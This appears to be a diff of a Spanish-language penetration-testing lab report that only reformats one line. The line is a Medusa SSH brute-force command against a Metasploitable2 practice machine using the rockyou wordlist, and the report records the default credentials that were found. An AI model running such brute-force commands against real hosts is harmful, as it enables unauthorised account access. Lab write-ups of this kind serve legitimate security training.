@@ -30,7 +30,7 @@
 ## Ataque 2 — Fuerza bruta SSH con Medusa
 
 **Herramienta:** Medusa v2.3  
-**Comando:** `medusa -h 10.0.2.5 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -v 4`  
+**Comando:** medusa -h 10.0.2.5 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -v 4  
 **Objetivo:** Puerto 22 (SSH) de Metasploitable2  
 **Resultado:**  ACCOUNT FOUND — msfadmin:msfadmin  
 
